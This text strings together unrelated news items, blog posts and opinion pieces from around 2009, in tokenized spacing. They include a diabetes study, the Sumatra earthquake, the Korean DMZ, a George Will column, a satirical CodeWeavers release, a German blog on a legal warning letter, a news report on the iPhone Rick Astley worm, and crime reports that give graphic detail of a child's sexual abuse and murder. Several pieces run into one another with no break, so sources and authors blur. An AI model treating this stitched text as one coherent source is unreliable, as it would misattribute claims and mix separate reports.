He also responded , " Wow ! " Yeah , it 's shocking to see a journalist actually care about something other than access , is n't it ?!
Like , By the way , video of the exchange shows that Thomas asked her devastating questions in her usual matter - of - fact and nigh - cheerful demeanor ; she neither " snarled " nor " snapped " at Gibbs .
But that 's what you get when a misogynist asshole covers the news .
Perhaps we need to ask the WaPo's ombudsman why they are ignoring obvious evidence that Dana Milbank 's sexism is spilling into and compromising the accuracy of his reporting .

Diabetes disrupts blood sugar levels A period of careful eating and regular exercise can stave off diabetes for a decade , a study suggests .
US researchers followed up nearly 3,000 overweight people who had taken part in a three year diabetes prevention programme .
The group had initially been divided into three - assigned either to a diet and exercise programme , the diabetes drug metformin or a placebo .
The Lancet report notes it was the dieters who reaped the most benefit .
All three groups were given access to ongoing lifestyle coaching once the initial three year trial had ended .
That trial , carried out by the US - based Diabetes Prevention Program Research Group , had shown a diet aimed at achieving 7 % weight loss , combined with half an hour of exercise five days a week , reduced the risk of developing Type 2 diabetes by 58 % compared with the placebo group .
The group on metformin , a drug which has been used to treat the condition since the 1950s , saw their risk decline by nearly a third .
We need more effective drugs for people who cannot follow intensive lifestyle therapy because of infirmity
Dr Anoop MisraLancet editorial
In the seven years after the trial ended , both the drug and placebo groups - now also eating more carefully and exercising - saw the rate of diabetes fall .
But the most significant drop was among those who had started out on a diet and exercise regime - their risk was over a third lower than the placebo group .
In an accompanying editorial , Dr Anoop Misra , a specialist in diabetes in New Delhi , described the prevention of the disease as " a long and winding road " .
' No short cut ' Dr Misra said : " There seems to be no short cut , and a persistent and prolonged intensive lifestyle intervention seems to be the most effective way to travel on it . "
But he warned it could not be the only measure : " We need more effective drugs for those who cannot follow intensive lifestyle therapy because of infirmity . "
Type 2 diabetes usually appears in people over the age of 40 , however increasing numbers of children are being diagnosed with the condition , some as young as seven .
Although obesity is a risk factor , not all people with type 2 diabetes are overweight .
Dr Iain Frame , head of research at Diabetes UK , said : " It is fascinating to read about the 10 - year follow up studies and of the importance of lifestyle interventions , with or without metformin , in the prevention of Type 2 diabetes even after 10 years .
" There is clearly no easy route to take to prevent Type 2 diabetes but indications are that with further research into the long - term benefits of good dietary advice , physical activity and , where necessary drug therapies , we may be a step closer into helping people at high risk of developing Type 2 diabetes modify their lifestyle choices that are sustainable in the longer term .

On Anniversary of Huge Software Giveaway , CodeWeavers Announces " It ’s NOT Free " Special for Wednesday , October 28
In 2008 CodeWeavers Gave Away 650,000 Free Licenses in 24 Hours ; This Year ’s Special Includes " Lame Duck Insurance Policy " Offering 2 - for - 1 Support
SAINT PAUL , Minn . ( October 27 , 2009 ) –
On the one - year anniversary of the software industry ’s largest - ever one day giveaway — a publicity stunt that nearly crippled his company — Jeremy White , the deeply embittered CEO of CodeWeavers , announced ALL of his software will NOT be free tomorrow in celebration .
" Not even CLOSE to free , " White proclaimed in announcing his non-giveaway .
" Still , we ’ll have some pretty good deals . "
Last Year : A Mushroom Cloud of New Users
The time was July , 2008 .
The plan : as part of CodeWeavers ' " Great American Lame Duck Challenge , " if President Bush could accomplish one of five goals by his term ’s end – including reducing the price of gas to below $ 3 / gallon – CodeWeavers would give away its CrossOver software to anyone who wanted it .
CrossOver is a highly - celebrated open source software that enables individuals to run Windows applications without purchasing a Windows license from Microsoft .
And then , in mid-October 2008 , as the global financial meltdown unfolded and the Great Recession kicked into fifth gear , gas hit $ 2.79 in the Twin Cities , and CodeWeavers announced that the giveaway was on .
The result was an Internet phenomenon .
On October 28 , 2008 , nearly 650,000 people downloaded CrossOver .
" Our servers melted , my sales director was sobbing uncontrollably and we basically burned to the waterline , " White said .
" We were suddenly the hottest commodity on the Web after porn . "
One year later , though , White says he ’s seen the light .
" My socialist phase has passed ; I ’m back to being a greedy capitalist .
It ’s time for somebody to bail me out ! "
This Year : CodeWeavers Actually Asks People to BUY Their Software
Wednesday , October 28 , 2009 , in a shocking , one - time - only shift away from its previous marketing stance , CodeWeavers has decided to try making money instead .
For a 24 - hour period commencing at midnight , October 28 , CodeWeavers will offer ALL of its software for NOT free .
" Half off , to be precise , " intoned White .
" But that ’s still pretty darned good .
No , we probably wo n't be moving as many licenses , but our servers wo n't be puddles of slag in the morning , either . "
Users buying during the NOT free promotional period will automatically later receive CodeWeavers forthcoming " Zombie Mallard " and " Snow Mallard " releases , named in honor of the twisted Lame Duck that spawned them .
" Zombie Mallard " will allow CodeWeavers users CrossOver Games product to play Valve 's fervently anticipated forthcoming Left 4 Dead 2 release , available in mid-November .
" Snow Mallard , " CodeWeavers next - generation productivity application , will allow users to install Windows applications directly from CodeWeavers huge online database of known software installation recipes .
" We think the Mallard releases will offer significant improvements to the way our current ( non-paying ) customers enjoy using CrossOver , " White chuckled , then gagged from his stress - induced acid reflux .
" A pity the Mallards wo n't QUITE be ready until after the Lame Ducker 's 1 - year support period has expired .
That 's just pure coincidence , though . "
CodeWeavers Offering Assuring Insurance With Sale
White is also offering customers two further perks during this year ’s " giveaway . "
First , they will receive the Lame Duck Insurance Policy .
" Starting Oct. 28th , for every day the customer waits for Snow Mallard to be released , we 'll tack TWO days onto their support entitlements , " White said from his desk , as he bent over and picked up a penny .
" How ’s that for a public option ?
" It ’s a pretty sweet deal :
The later we ship , the more value the customer receives for their money .
Not only that , but we 're giving away 25 free lifetime licenses of CrossOver as well .
That oughta pump up some interest ; at least , that 's what Marketing better hope , " White muttered , in reference to his disgraced Marketing department , now chained to their desks until the company sells 650,000 PAID licenses .
" Marketing got us into this mess in the first place ; they ain't getting out of it until I say they ’re out , " White sneered .
" Back to work , you ! "

Indonesian officials have said that at least 770 people have been killed and thousands more feared trapped under collapsed buildings , following a powerful earthquake on Wednesday .
The 7.6 - magnitude quake struck off the coast of the Indonesian island of Sumatra , and officials are trying to determine the extent of the damage .
A second earthquake hit the region at 01.52 UTC on Thursday , measuring at a magnitude of 6.8 , with the epicentre about 150 miles southeast of the first quake .
The death toll is expected to rise as rescue workers dig through the rubble , and the Indonesian health ministry said it believes that the death toll could go into the thousands .
Hundreds of people are believed seriously injured .
As of 13.00 UTC , a disaster ministry official said that the official death toll was at 770 , with 290 people being heavily wounded and a further 2,090 receiving light injuries .
However , prime minister Jusuf Kalla said that the true death toll was " definitely higher " than the current statistics , due to difficulties recovering bodies .
" It 's hard to tell because there is heavy rain and a blackout , " Kalla said .
Most of the deaths have been reported in the Sumatra city of Padang , where at least 500 buildings were toppled by the quake .
A hospital , hotel , and school facilities were among the buildings destroyed in Padang , a coastal city of 900,000 .
We really need help .
We call on people to come to Padang to evacuate bodies and help the injured .
— Mayor of Padang
Padang 's mayor , Fauzi Bahar , asked for help on Indonesian radio .
" We really need help .
We call on people to come to Padang to evacuate bodies and help the injured , " he said , saying that his city was " overwhelmed " by the earthquake .
Susilo Bambang Yudhoyono , the country 's president , visited some of the areas most affected by the disaster .
" I ask rescue workers to continue working in teams with clear goals to keep looking for survivors " he said . " [...]
This is a natural disaster , so let us remain strong in dealing with it . "
Titi Moektijasih from the United Nations Office of Coordination of Humanitarian Affairs said that the current disaster recovery efforts were not sufficient .
" Compared to the extent of the damage , you see there should be more equipment , more people to do this , " she told the AFP news agency .
The Red Cross ' head of operations in Indonesia , Bob McKerrow , told the BBC news agency that it was difficult to dispatch personnel to affected areas due to poor infrastructure .
" it 's just such a vast area to be working in with such bad infrastructure , " he said . " [...]
The roads and bridges have all been damaged , so [ there is ] a challenge ahead of us . "
McKerrow said that 400 personnel , among them fifty doctors , had arrived in Indonesia by airplane on Thursday .
Indonesian health minister Siti Fadilah Supari said that a mall and two hospitals in Padang were destroyed by the tremors .
" This is a high - scale disaster , more powerful than the earthquake in Yogyakarta in 2006 when more than 3,000 people died , " he said .
Indonesia 's government has sent medical teams and military planes to help with relief efforts , and announced $ 10 million in emergency aid .
The British Red Cross started a fundraiser to help people affected by the earthquake .
HAVE YOUR SAY
Are you in the area ?
Have you been affected in some way by the earthquake ?
The earthquakes were the latest in a string of natural and man-made disasters to hit the sprawling archipelago of 226 million people .
Indonesia is prone to seismic upheaval due to its location on the so - called Pacific Ring of Fire , an arc of volcanoes and fault lines encircling the Pacific Basin .
In 2004 , a 9.1 - magnitude earthquake along the same fault line caused a massive tsunami that killed more than 200,000 people in a dozen countries .
Scientists had warned that a severe earthquake might strike the area for some time , however , Indonesia did not have sufficient funds to pay for disaster preparation measures , the Al Jazeera news agency reported .

SEOUL ( Reuters ) -
As a united Germany marks the 20th anniversary of the Berlin Wall ’s fall on Monday , about 1 million soldiers face off across the Cold War ’s last great divide -- the Demilitarised Zone ( DMZ ) separating the two Koreas .
Tourists look at South Korean flags and reunification banners hung on a barbed wire fence , on Freedom Bridge at Imjingak pavilion near the Demilitarized Zone ( DMZ ) separating the two Koreas in Paju , about 52 km ( 32 miles ) north of Seoul , November 9 , 2009 .
As a united Germany marks the 20th anniversary of the Berlin Wall 's fall on Monday , about 1 million soldiers face off across the Cold War 's last great divide -- the DMZ separating the two Koreas .
REUTERS / Jo Yong - Hak
The 4 - km ( 2.5 - mile ) wide no man ’s land , established under the ceasefire that ended the 1950 - 53 Korean War , runs 245 km ( 150 miles ) .
It divides the peninsula with razor - wire fences , minefields and one of the heaviest collection of armaments on earth .
The Berlin Wall anniversary has sparked a longing in South Korea for unity but also worries about the enormous costs involved if the DMZ was dismantled and North and South Korea were united .
“ The economic gap between the two Koreas is far wider than that of the two Germanys before reunification , ” the Dong - A Ilbo newspaper said in an editorial .
North Korea is an economic backwater , with annual GDP of $ 17 billion in 2008 -- two percent the size of the South ’s economy .
By some estimates it would cost more than $ 1 trillion for South Korea to absorb the North , the only real scenario in the event of reunification .
That would wreak havoc on South Korea ’s economy , with a state - funded research agency saying it would raise the tax bill for South Koreans by the equivalent of two percentage points annually for 60 years .
Aside from the huge costs , there has been virtually no contact between the two Koreas for decades , which have cut off almost all phone links and mail and did not have a formal meeting for about 20 years after the war .
East Germans by comparison were able to see the outside world through West German TV and the two countries had far more exchanges of people .
Recent polls show more than 60 percent of South Koreans want unification , but they would prefer it happen later rather than sooner because of the cost .
About 70 percent of respondents see the North as a threat and few think it will give up its nuclear weapons any time soon .
FACTORY PARK AND MOUNTAIN RESORT
What little cooperation there has been in recent years between the Koreas has been confined to a mountain resort and a joint factory park located just north of the DMZ .

The projects , complete with new road and rail links , were built by the South with the help of an affiliate of the Hyundai conglomerate and have seen their fortunes ebb and flow as ties between the two states have gone from warm to frigid .
The DMZ is one of the most popular tourist sites in South Korea , attracting more than 600,000 visitors a year who see tank traps as they head toward the border and tunnels the North built under the zone decades ago to support an invasion .
The highlight of most tours is the Panmunjom truce village that hosted the armistice talks and which sits within the DMZ .
It is now home to uneasy staring matches between soldiers from the two Koreas as well as U.S. forces in the South .
The actual border is called the Military Demarcation Line and is only an ankle - high strip of concrete in Panmunjom .
In most of the DMZ , it is marked only by 1,290 yellow signs less than one square meter in size .
If the DMZ ever comes down , South Korea wants to set up a nature preserve in the long strip , which has become a haven for wildlife including endangered species of birds , thousands of types of plants and 70 different mammals .
By George Will - November 5 , 2009
WASHINGTON -- Actress Cate Blanchett , who has played Queen Elizabeth I , is performing here , portraying someone less than regal -- flurried , anxious Blanche DuBois , in Tennessee Williams ' " A Streetcar Named Desire . "
If Obama administration officials involved in formulating Afghanistan policy see her , they should wince when she speaks DuBois ' signature line : " I have always depended on the kindness of strangers . "
The U.S. mission -- whatever it is ; stay tuned -- in that fractured semi-nation depends on substantially increased competence and radically reduced corruption among the strangers governing in , if not much beyond , Kabul .
One stranger is Afghanistan 's president .
We are getting to know him well .
On Jan. 29 , 2002 , just 114 days after the U.S. intervention in Afghanistan , President George W. Bush , during his State of the Union address , introduced to a joint session of Congress and to a national television audience a man in the gallery of the House chamber -- " the distinguished interim leader of a liberated Afghanistan , Chairman Hamid Karzai . "
Interim no more , he has won -- or at least secured -- another five years in office .
Abdullah Abdullah , whom Karzai defeated in Aug. 20's ruinous election -- fraudulent ballots , bogus polling places , one third of Karzai 's votes disallowed -- has decided not to participate in a runoff , partly because it was to be conducted by those who supervised the first election .
When it was reported that Abdullah was thinking about withdrawing , Secretary of State Hillary Clinton 's response was inane : " We see that happen in our own country where , for whatever combination of reasons , one of the candidates decides not to go forward .
I do n't think it has anything to do with the legitimacy of the election . "
So , Afghanistan is just like America -- candidates decide " not to go forward . "
After hearing that Abdullah would withdraw , Clinton said , " I do not think it affects the legitimacy .
...
When President Karzai accepted ( the runoff ) without knowing what the consequences and outcome would be , that bestowed legitimacy from that moment forward . "
So , the U.S. government chooses to believe that legitimacy descends upon Karzai simply because he agreed to another election controlled by his operatives .
Such desperate sophistry is dismaying evidence of the mentality of the Obama administration as it contemplates the military 's request for a substantial increase of U.S. forces , just eight months after the last increase .
Remember the reason given for that one ?
In March President Obama increased U.S. forces in Afghanistan .
In September he said : " I did order 21,000 additional troops there to make sure that we could secure the election , because I thought that was important . "
The election was indeed important .
Last Sunday , on " This Week , " Valerie Jarrett , one of the president 's confidants , was asked if Karzai 's demolition of the process that was supposed to legitimize him will " cast a cloud over President Karzai and make it more difficult ... to implement ( the president 's ) strategy . "
Jarrett replied :
" We do n't think that it 's going to add a complication to the strategy .
...
We 're going to work with the leader of the Afghan government and hopefully that 's going to improve the state of conditions for the people in Afghanistan , and also help us as we try to bring this war to a close . "
Hopefully ?
Talk about the audacity of hope .
Jarrett perhaps signaled the goal that the president 's strategy , which is a work in progress , is to serve -- bringing the war " to a close . "
Barack Obama has no intention of being a war president .
Already the annual cost of America 's errand in Afghanistan is larger than that country 's GDP .
U.S. success depends on Afghans perceiving the central government as legitimate , which they will not do for at least five more years .
Americans , led by a commander in chief whose heart is not in it , will not sustain the years of casualties and other costs necessary to create self - sufficient Afghan security forces beneath a corrupt regime .
On July 24 , 2008 , in Berlin , Obama stressed the need to " defeat the Taliban . "
Then , however , he spoke as a " citizen of the world , " not as president .
Now he is being presidential by reconsidering some implications of the politically calculated rhetoric that helped make him president .
He is rightly ignoring those who cannot distinguish thinking from dithering .
President Woodrow Wilson , looking censoriously at some nations to America 's south , reportedly vowed , " We will teach them to elect good men . "
Whatever strategy Obama adopts , its success cannot depend on America teaching Afghans to do that .
If he is looking for a strategy that depends on legitimacy in Kabul , he is looking for a unicorn .
( CNN ) -- A 14 - year - old California boy told police he drowned his 4 - year - old neighbor on Friday because the child had threatened to tell his mother the older boy had molested him , according to an affidavit made public Wednesday .
Raul Renato Castro has been charged in Fresno County as an adult , with special circumstances including murder during a child molestation , sodomy , kidnapping and murder of a witness to prevent testimony , according to the district attorney 's office .
He faces separate felony charges of kidnapping , sodomy and child molestation .
The affidavit , filed by the Fresno County Sheriff 's Department , says Castro told investigators he lured the victim , Alex Christopher Mercato , into his apartment " by telling the victim he had something to show him . "
Police have said no one else was in the Mendota , California , house at the time .
Castro then talked the boy into entering the bathroom , according to the document .
Castro said he then sodomized the child , after which " the victim tripped over the carpet , fell , and hit the back of his head on the bathtub , " the affidavit says .
" Castro said the victim started crying and told Castro he was going to tell his mother .
Castro said he panicked and decided to kill the victim by drowning him in the bathtub .
" Castro turned on the water to the bathtub and filled it up just enough to put the victim 's face underwater and drowned him .
Castro said he held the victim underwater 2 - 4 minutes .
Castro got into the bathtub with the victim , held him down until the victim died . "
" Castro then carried the victim over his left shoulder and put him [ in ] ... the clothes dryer to conceal him . "
The incident occurred Friday afternoon , after Mercato 's parents discovered that their child , who had been playing outside their house , was missing , Fresno County Sheriff Margaret Mims told reporters Monday .
The parents called police , who searched the neighborhood and nearby parks in Mendota , 33 miles west of Fresno , she said .
Soon , the FBI was called in .
On Saturday , authorities resumed the search and found the body stuffed inside the dryer in the apartment next door .
An autopsy determined the victim had drowned .
Under California law , a 14 - year - old is not eligible for the death penalty or a sentence of life without the possibility of parole .
If found guilty , Castro could receive no more than 32 years to life plus 15 years .
— A Duke University police officer has been arrested and charged with raping a woman in Dothan , Ala. , over the weekend .
Webster Delenn Simmons , 37 , of Rougemont , was arrested Monday after the alleged attack was reported .
He was charged with first - degree rape and first - degree sodomy .
The 34 - year - old victim went with Simmons to a bar on Friday night , Houston County Sheriff Andy Hughes said .
The victim bought every drink but her last , which Simmons bought .
Hughes said Simmons possibly laced the victim 's drink with drugs .
Hughes said the victim remembers leaving the bar .
When she woke up early Saturday , she was being raped in Simmons ' car .
She was gagged and handcuffed .
After executing a search warrant , authorities found two pair of handcuffs , a ball gag , a thick white rope , an unknown power source with wires attached to a nail , a whip and flog , and what looked like medical tubing .
Authorities suspect Simmons may have committed other sex crimes , Hughes said .
“ We are certainly cooperating with the officials in Alabama .
We really do n't have any indication there 's been another crime , but we will continue to cooperate with them or any other agency as we need to , ” Duke University Police Chief John Dailey said .
Simmons , who had no criminal record , was hired by Duke last December .
“ It 's disturbing to hear any serious allegation about any law enforcement officer because they represent all of us in law enforcement .
So clearly it is concerning , ” Dailey said .
Simmons was being held under a $ 120,000 bond Tuesday at the Houston County Jail in Alabama .
He has been suspended with pay pending further investigation , university spokesman Keith Lawrence said .
“ Clearly this is one individual who does not represent the good work and the dedication of the 173 other employees that we have at the department , ” Dailey said .
Prior to his work at Duke , Simmons was a master officer with the Raleigh Police Department from 1998 to 2007 .
Duke police said they will conduct their own internal investigation of Simmons .
I became a prisoner of Workers Compensation , something I knew nothing about .
If I had thought about it at all , I would have assumed that the best hospital in the city would provide me , one of their best employees , with the best medical care available .

The surgeon on call that night from the orthopedic group chosen by the hospital to treat WC injuries turned out to be an excellent ... pediatric surgeon .
She 's just who you 'd want if your baby was born with a clubfoot .
A complex , multi-focal fracture of a mature leg ?
Not so much .
She gets partial credit ; she did diagnose two of four fractures .
The broken tibia and fibula were hideously apparent on x-ray , no doubt distracting her attention from my broken ankle and foot .
At no point did she ( or anyone else ) assess me for other injuries .
After surgery to place a rod inside my tibia and a night in the ICU , I stayed in the hospital two more days so I could transition to oral pain meds and learn how to walk with crutches .
It was n't until I was home , off the morphine drip , that I began to notice my back .
I was taking Oxycontin every twelve hours plus percocet for break - through pain , and yet my back woke me up every night .
One of my clearest memories of those first weeks is of waking up every night with searing back pain , fumbling around for my crutches , and floating in a tub of hot water .
Nothing else touched the pain .
When my staples were removed , new x-rays were taken .
I could see that the fractured ends of my tibia did n't approximate well , i.e. , there was a gap between them .
My gut started talking to me , the same gut we all have and we 've all been told to listen to , but I let the surgeon convince me it was fine .
She was NOT able to convince me my ankle was fine .
By then my ankle and foot were black and hugely swollen , so she ordered a CT scan ... and found the other fractures .
" I 'm so sorry , Kelley .
It never occurred to me to look for fractures in your foot and ankle because the force of that kind of fall always goes up . "
Right .
It did go up , but it started in the foot .
I realized I was involved in a clusterfuck .
I insisted my case be handled by someone else .
This second surgeon noted I had a non-union of the tibia , an unstable fracture , and intractable pain .
If I grasped my leg below the knee and gave it a gentle shake , my foot and lower leg would rotate around the fracture site .
In spite of this , his treatment plan included progressive weightbearing and physical therapy , combined with insults and a complete lack of compassion .
His idiotic plan resulted in my tibia being " cored out " by movement of the rod .
By the time six months had passed and I was fortunate enough to make my way to Denver to the Center for Limb Preservation , my tibia was almost translucent on x-ray .
Clusterfuck .
It took four years and five surgeries , but my leg works fine today .
There were many dark nights when I thought I would lose it .
I was non-weightbearing on crutches for a good two years ... and blew out both of my shoulders .
During surgery to fix the first shoulder , the anesthesiologist knocked a chunk out of the bony structure behind my bottom teeth , using unsterile procedure , and gave me sepsis .
Six weeks later , during surgery to repair the second shoulder , someone moving me in the OR grabbed my arm and pulled , tearing two tendons in my healing shoulder .
Clusterfuck .
It took a gifted lawyer to get me away from that insane situation and into the care of a shoulder surgeon in a different practice .
He did a third shoulder surgery to repair the torn tendons .
Did a nice job .
As I said earlier , my back hurt from the get - go .
" Of course your back hurts .
You 're on crutches .
Here - go see this chiropractor . "
I did n't have an MRI of my back until sixteen months after the initial injury .
It showed three herniated discs .
The specialist who ordered the MRI had frightening prescribing habits : Oxycontin - lots of it .
Percocet .
Sleeping pills .
Muscle relaxants .
Antidepressants .
Injections of steroids into my spine and sacroiliac joints every three months .
He also had a massive ego , a preference for yelling at his patients , and an unfortunate tendency to make inappropriate sexual remarks .
When I declined antidepressants ( I was n't depressed , I was pissed off and scared ) I thought he was going to hit me .
Meanwhile , the problems with my back got increasingly worse , to the point that I have permanent nerve damage in my " good " ankle and foot .
Clusterfuck .
A surgical consult recommended fusing four vertebrae together , which would leave me with so little spinal flexibility I might not be able to live by myself and , oh , by the way , I might not feel any better afterwards .
A second consult , arranged by my lawyer , agreed that would be the right procedure ...
IF I was going to have a procedure , but he thought I should leave it alone .
I never did have back surgery and , with a lot of hard - won wisdom I 'll share in a future diary , I have an arsenal of non-pharmaceutical pain management techniques that allow me to live fairly comfortably ( most of the time ) , if not work .
When I was n't having surgery , I was in rehab .
I had physical therapy for my leg ( five times ) , for both shoulders ( several times ) and for my back ( most of the time ) .
I spent hours with massage therapists and acupuncturists .
In all , I had nine gatekeeper physicians , five orthopedic surgeons , one allergist , two internists , one chiropractor , two podiatrists , two dentists , two oral surgeons , one endodontist , one psychologist , five physical therapists , one massage therapist , three acupuncturists , and eleven home health aides .
I wore four bone stimulators at different times .
I had a total of eight surgeries , fifteen steroid injections , eight doses of IV Ancef , thirteen rounds of oral antibiotics , three MRI 's , one CT scan , one white blood cell scan , and one arthrogram .
It was a clusterfuck .
The hospital fired me when I could n't return to work in three months .
I could n't afford COBRA premiums on the disability they were paying me , and Social Security initially denied my application for benefits .
The WC director at the hospital was rude , threatening , unhelpful and a daily source of stress .
( My lovely lawyer , once retained , saw to it I never spoke with her again . )
It took six years to settle everything , six years when I did n't know if I would be sleeping in a bus station and eating cat food , or if I 'd be okay .
The disabled plates on my car came at the price of my health and my profession ... but I am happy to report the hospital paid for the car itself .
The hospital also pays my mortgage every month .
There 's a trust fund that pays for all medical expenses related to said clusterfuck , and Medicare takes care of my other health needs .
Once we get something done about healthcare , we must not forget about our fellow citizens who are in Workers Comp hell .
If this could happen to me , an educated , articulate , and assertive RN , imagine the same situation with someone who barely speaks English , who has little education , and / or who has no experience with either the healthcare system or the legal system .
Bloggen in Deutschland ist gefährlich , vor allem dann , wenn man Missstände beleuchtet .
Das habe ich jetzt am eigenen Leib erfahren müssen , denn vor zwei Tagen flatterte mir eine Abmahnung einer Frankfurter Anwaltskanzlei ins Haus .
Ihr Auftraggeber : Rechtsanwalt Dr. Udo Kornmeier und die Kanzlei Kornmeier & Partner .
Stein des Anstoßes ist mein Blogeintrag „ Filesharing - Abmahnungen : DigiProtect und Kornmeier – eine juristische Analyse “ sowie ein Interview , das ich dem Sender Radio Fritz am 21.11.09 gegeben habe .
Die Anwaltskanzlei die Kornmeier in dieser
Sache vertritt , fährt schwere Geschütze auf , denn sie beziffert den Gegenstandswert auf EUR 250.000 , - und fordert eine Vertragsstrafe von EUR 15.000 , - für den Fall des Verstoßes .
Ich soll es unterlassen zu behaupten , mir läge in einer Abmahnangelegenheit der Fa. DigiProtect ein Schreiben der Kanzlei Kornmeier vor , in welchem Anwaltskosten nach dem Rechtsanwaltsvergütungsgesetz geltend gemacht würden .
Außerdem soll ich nicht weiter behaupten , dass sich die Kanzlei Kornmeier ausdrücklich darauf beruft , dass die ihrer Mandantin nach dem RVG entstandenen Kosten zu erstatten seien und man dieses Verhalten zivilrechtlich als unerlaubte Handlung und strafrechtlich als Betrug oder Betrugsversuch qualifizieren könne .
Und widerrufen soll ich das Ganze auch noch , nämlich öffentlich in diesem Blog sowie schriftlich gegenüber Radio Fritz ( RBB ) .
Nun hoffe ich , dass alle da draußen die Botschaft verstanden haben .
Rechtsanwalt Kornmeier fordert überhaupt keine Anwaltsgebühren nach dem Rechtsanwaltsvergütungsgesetz und natürlich ist auch kein Abgemahnter verpflichtet , diese Kosten zu erstatten .
In den eigenen Schreiben der Kanzlei Kornmeier liest sich das freilich geringfügig anders , nämlich im Wortlaut u.a. so :
„ Wir werden daher unserer Mandantschaft die gerichtliche Geltendmachung ihrer Forderungen empfehlen (…)
Der zu erstattende Betrag errechnet sich in diesem Fall wie folgt :
Streitwert : EUR 10.000,00
1,3 Geschäftsgebühr ( gem. §§ 2 , 13 , 14 RVG i.V.m. Nr. 2300 VVRVG ) : EUR 631,80
Auslagenpauschale ( gemäß Nr. 7002 VV RVG ) : EUR 20,00
Gesamtsumme : EUR 651,80 „
Die jetzt in dem Abmahnschreiben aufgestellte Behauptung , die Kanzlei Kornmeier würde gar keine Erstattung von Anwaltskosten nach dem RVG geltend machen , kann ich deshalb – freundlich formuliert – nur als Chuzpe betrachten .
Welchen Erklärungsinhalt hat dieser Wortlaut wohl ?
Ich würde daher auch gerne Informationen über andere Fälle sammeln , in denen die Kanzlei Kornmeier schriftlich ganz ausdrücklich Anwaltskosten nach dem RVG berechnet und Erstattung verlangt hat und auch Informationen zu den Fällen , in denen Abgemahnte diese Kosten daraufhin vollständig oder teilweise an die Kanzlei bezahlt haben .
Liebe Kollegen und Betroffene , schickt mir bitte Scans solcher Schreiben an ts@cplus.de .
Das wird mir helfen , das System Kornmeier / DigiProtect besser darstellen zu können .
Und wie werde ich mich jetzt verhalten und auf die Abmahnung reagieren ?
Ich habe dem von Dr. Kornmeier beauftragten Rechtsanwalt mittlerweile geschrieben , dass es nicht einer gewissen Ironie entbehrt , wenn sein Mandant jetzt versucht , sein eigenes unlauteres Geschäftsmodell mit Hilfe des UWG ( Gesetz gegen den unlauteren Wettbewerb ) zu verteidigen und ihn zudem wissen lassen , dass ich mich gegen die Unterlassungs - und Widerrufsforderung zur Wehr setzen werde , notfalls auch unter Ausschöpfung des Rechtswegs .
Dass man versucht , mich mit dem Risiko von Prozesskosten , die schnell den fünfstelligen Bereich erreicht haben , einzuschüchtern und mundtot zu machen , ist klar , angesichts dessen , dass das Scheitern eines lukrativen aber unlauteren Geschäftsmodells droht .
Update vom 27.11.09 :
Im Laufe des Tages sind hier eine ganze Menge an Informationen und Unterlagen eingetroffen , die die bisherige Einschätzung bestätigen und erhärten .
Die Kanzlei Kornmeier hat ihre Textbausteine im Laufe des Jahres 2009 leicht abgeschwächt .
Im Februar 2009 wurden Anwaltskosten nach dem RVG noch deutlicher gefordert und zwar mit folgender Formulierung :
„ Ihr Mandantschaft ist daher verpflichtet , die unserer Mandantschaft entstandenen Anwaltskosten nach den einschlägigen Bestimmungen des Rechtsanwaltsvergütungsgesetzes ( RVG ) auf Basis eines angemessenen Streitwertes für den Unterlassungsanspruch in Höhe von EUR 10.000,00 zu übernehmen .
(…)
Falls dieser Betrag nicht bis zum ( … ) auf das folgende Konto unserer Mandantschaft ( … ) bezahlt wird , werden wir unserer Mandantschaft empfehlen , ihre Zahlungsansprüche vor der zuständigen Frankfurter Gerichtsbarkeit geltend zu machen “
In der gegen mich gerichteten Abmahnung heißt es demgegenüber :
“ ( … ) behaupten Sie ( …)
Ihnen liege ein Schreiben der Kanzlei Kornmeier ( … ) vor , in welchem Anwalstkosten nach dem RVG geltend gemacht würden , die Kanzlei Kornmeier berufe sich dabei ausdrücklich darauf , dass die ihrer Mandantschaft DigiProtect GmbH nach dem RVG entstandenen Kosten zu tragen seien ( … ) Diese Aussagen sind unwahr ! ! “
Vermutlich waren die zwei Ausrufezeichen auch dringend notwendig , um das zu unterstreichen .

Media Matters releases new video showing right - wing media 's leading role in driving movement
Washington , DC - Today , Media Matters for America released a new video demonstrating how the conservative echo chamber operates in the age of President Obama .
Conservative activists - aided by Fox News , a political organization disguised as a news network - use distortions , lies , and smear tactics to shape public opinion and influence national policy .
" Unlike the Clinton and Bush years , the right - wing echo chamber is now aided by a network that has thrown any remaining shred of journalistic credibility out the window , " said Eric Burns , President of Media Matters .
" The modern conservative movement has gained an enormous megaphone in Fox News that they are using to impact legislation and shape public opinion . "
Burns added : " People need to decide how long they will allow the policies of their country to be dictated by a media outlet accountable not to voters or constituents but to ratings . "
i Phones across Australia lit up with the face of ' 80s crooner Rick Astley this week as a Wollongong TAFE student made international headlines for releasing the first virus to infect the popular smartphone platform .
The virus is able to reset the phone wallpaper to display an image of Astley ( a practice known as rickrolling ) on “ jailbroken ” iPhones .
The infected iPhone screen , Rick Astley virus wallpaper image ( top right ) , and Ashley Towns ( bottom right ) .
These phones are unlocked so users can use non-Apple applications or service providers , and only those who had failed to reset default security passwords were affected .
Ashley Towns , the 21 - year - old Australian who has taken credit for the high - tech stunt , wrote on his Twitter page yesterday that he created the virus to raise awareness of security issues related to iPhone passwords .
In rural areas of Indonesia , weddings are communal , open - air affairs .
Some 400 people attended the nuptials of a couple in Pulau Aiya , a village outside Padang , last Wednesday .
Then the ground shook and swallowed everyone up .
" They were sucked 30 m deep into the earth , " Rustam Pakaya , head of the Indonesian Health Ministry 's crisis centre , said yesterday .
" Even the mosque 's minaret , more than 20 m tall , disappeared . "
Three days after a 7.6 - magnitude earthquake devastated Padang and surrounding areas on the west coast of Sumatra , the full impact of the tragedy is starting to become clear .
Whole villages were found obliterated yesterday by rescuers pushing deeper into the disaster zone , where roads remain cut off and survivors – still desperately awaiting aid – are subsisting on coconut milk .

The official death toll from Wednesday 's quake stood at 809 last night , but the Indonesian Red Cross believes up to 4,000 people are lying beneath the rubble of collapsed buildings .
The chances of finding more survivors are receding by the hour .
Rescuers , boosted by teams from Britain , Australia and Japan , among other countries , are pulling out body after body .
The morgues are overflowing .
Still , extraordinary stories of survival are continuing to emerge .
" Please help , I 'm trapped , my position is in the house by the stairs . "
That brief text message , sent to his father in Jakarta nearly 600 miles away , saved Johnson Chandra 's life after a four - storey building in Padang toppled , trapping him and his wife .
Mr Chandra tried without success to call relatives and friends on his mobile phone .
" I was desperate , " he said .
" But I suddenly thought about texting , so I texted my dad to let him know where I was .
Later I heard people coming , so I tried to make a sound .
I found a small nail and started banging it .
They finally found me .
Slowly they broke concrete around me , and I was rescued 10 hours after the quake . "
